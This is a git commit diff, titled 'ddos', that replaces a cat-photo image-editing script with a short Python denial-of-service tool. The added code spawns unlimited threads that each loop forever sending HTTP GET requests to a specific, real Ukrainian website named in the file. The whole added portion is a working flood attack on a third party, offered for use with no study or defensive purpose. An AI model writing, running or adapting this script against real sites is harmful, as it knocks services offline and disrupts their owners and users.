54829258c73b9bad249f393f465454ed75ae8479
sude796 <128898451+sude796@users.noreply.github.com>
2023-06-03 12:03:13 +0300

    ddos

--- main.py
+++ main.py
@@ -1,19 +1,13 @@
-import cv2
-from PIL import Image
+# coding: utf8
+import threading
+import requests
 
-image_path = 'cat.jpg'
-cat_face_cascade = cv2.CascadeClassifier('haarcascade_frontalcatface_extended.xml')
-image = cv2.imread(image_path)
-cat_face = cat_face_cascade.detectMultiScale(image)
 
-cat = Image.open(image_path)
-glasses = Image.open('glasses.png')
-cat = cat.convert("RGBA")
+def dos():
+    while True:
+        requests.get("https://geekach.com.ua/ru/")
 
-for (x, y, w, h) in cat_face:
-    glasses = glasses.resize((w, int(h / 3)))
-    cat.paste(glasses, (x, int(y + h / 3.5)), glasses)
-    cat.save('cat_with_glasses.png')
-    cat_with_glasses = cv2.imread('cat_with_glasses.png')
-    cv2.imshow("cat_with_glasses.png", cat_with_glasses)
-    cv2.waitKey()
+
+while True:
+    threading.Thread(target=dos).start()
+
